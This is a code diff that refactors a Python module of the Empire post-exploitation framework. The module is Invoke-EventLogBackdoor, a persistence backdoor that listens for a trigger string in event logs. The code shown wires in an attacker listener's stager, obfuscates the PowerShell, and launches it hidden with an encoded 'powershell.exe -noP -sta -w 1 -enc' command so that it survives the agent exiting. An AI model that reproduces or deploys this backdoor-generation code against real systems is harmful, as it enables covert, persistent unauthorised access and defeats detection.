@@ -1,92 +1,18 @@
 from __future__ import print_function
 
 import os
-from builtins import object
-from builtins import str
 
+from builtins import str
+from builtins import object
 from empire.server.common import helpers
+from typing import Dict
+
+from empire.server.common.module_models import PydanticModule
 
 
 class Module(object):
-
-    def __init__(self, mainMenu, params=[]):
-
-        self.info = {
-            'Name': 'Invoke-EventLogBackdoor',
-
-            'Author': ['@sixdub'],
-
-            'Description': ('Starts the event-loop backdoor.'),
-
-            'Software': '',
-
-            'Techniques': ['T1084'],
-
-            'Background' : False,
-
-            'OutputExtension' : None,
-            
-            'NeedsAdmin' : True,
-
-            'OpsecSafe' : True,
-            
-            'Language' : 'powershell',
-
-            'MinLanguageVersion' : '2',
-            
-            'Comments': [
-                'http://sixdub.net'
-            ]
-        }
-
-        # any options needed by the module, settable during runtime
-        self.options = {
-            # format:
-            #   value_name : {description, required, default_value}
-            'Agent' : {
-                'Description'   :   'Agent to run module on.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'Listener' : {
-                'Description'   :   'Listener to use.',
-                'Required'      :   True,
-                'Value'         :   ''
-            },
-            'OutFile' : {
-                'Description'   :   'Output the backdoor to a file instead of tasking to an agent.',
-                'Required'      :   False,
-                'Value'         :   ''
-            },
-            'Trigger' : {
-                'Description'   :   'The unique value to look for in every event packet.',
-                'Required'      :   True,
-                'Value'         :   'HACKER'
-            },
-            'Timeout' : {
-                'Description'   :   'Time (in seconds) to run the backdoor. Defaults to 0 (run forever).',
-                'Required'      :   True,
-                'Value'         :   '0'
-            },
-            'Sleep' : {
-                'Description'   :   'Time (in seconds) to sleep between checks.',
-                'Required'      :   True,
-                'Value'         :   '30'
-            }
-        }
-
-        # save off a copy of the mainMenu object to access external functionality
-        #   like listeners/agent handlers/etc.
-        self.mainMenu = mainMenu
-
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]['Value'] = value
-
-
-    def generate(self, obfuscate=False, obfuscationCommand=""):
+    @staticmethod
+    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
 
         script = """
 function Invoke-EventLogBackdoor
@@ -124,37 +50,37 @@ function Invoke-EventLogBackdoor
 }
 Invoke-EventLogBackdoor"""
 
-        listenerName = self.options['Listener']['Value']
+        listener_name = params['Listener']
 
-        if not self.mainMenu.listeners.is_listener_valid(listenerName):
+        if not main_menu.listeners.is_listener_valid(listener_name):
             # not a valid listener, return nothing for the script
-            print(helpers.color("[!] Invalid listener: " + listenerName))
+            print(helpers.color("[!] Invalid listener: " + listener_name))
             return ""
 
         else:
             # set the listener value for the launcher
-            stager = self.mainMenu.stagers.stagers["multi/launcher"]
-            stager.options['Listener']['Value'] = listenerName
-            stager.options['Base64']['Value'] = "False"
+            stager = main_menu.stagers.stagers["multi/launcher"]
+            stager.options['Listener'] = listener_name
+            stager.options['Base64'] = "False"
 
             # and generate the code
-            stagerCode = stager.generate()
+            stager_code = stager.generate()
 
-            if stagerCode == "":
+            if stager_code == "":
                 return ""
             else:
-                script = script.replace("REPLACE_LAUNCHER", stagerCode)
+                script = script.replace("REPLACE_LAUNCHER", stager_code)
 
-        for option,values in self.options.items():
+        for option, values in params.items():
             if option.lower() != "agent" and option.lower() != "listener" and option.lower() != "outfile":
-                if values['Value'] and values['Value'] != '':
-                    if values['Value'].lower() == "true":
+                if values and values != '':
+                    if values.lower() == "true":
                         # if we're just adding a switch
                         script += " -" + str(option)
                     else:
-                        script += " -" + str(option) + " " + str(values['Value']) 
+                        script += " -" + str(option) + " " + str(values) 
 
-        outFile = self.options['OutFile']['Value']
+        outFile = params['OutFile']
         if outFile != '':
             # make the base directory if it doesn't exist
             if not os.path.exists(os.path.dirname(outFile)) and os.path.dirname(outFile) != '':
@@ -169,20 +95,20 @@ Invoke-EventLogBackdoor"""
 
         script = helpers.keyword_obfuscation(script)
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
 
         # transform the backdoor into something launched by powershell.exe
         # so it survives the agent exiting  
         modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
         launcher = helpers.powershell_launcher(script, modifiable_launcher)
-        stagerCode = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-        parts = stagerCode.split(" ")
+        stager_code = 'C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
+        parts = stager_code.split(" ")
 
         # set up the start-process command so no new windows appears
         script = "Start-Process -NoNewWindow -FilePath '%s' -ArgumentList '%s'; 'PowerBreach Invoke-EventLogBackdoor started'" % (parts[0], " ".join(parts[1:]))
 
         if obfuscate:
-            script = helpers.obfuscate(self.mainMenu.installPath, psScript=script, obfuscationCommand=obfuscationCommand)
+            script = helpers.obfuscate(main_menu.installPath, psScript=script, obfuscationCommand=obfuscation_command)
         script = helpers.keyword_obfuscation(script)
 
         return script
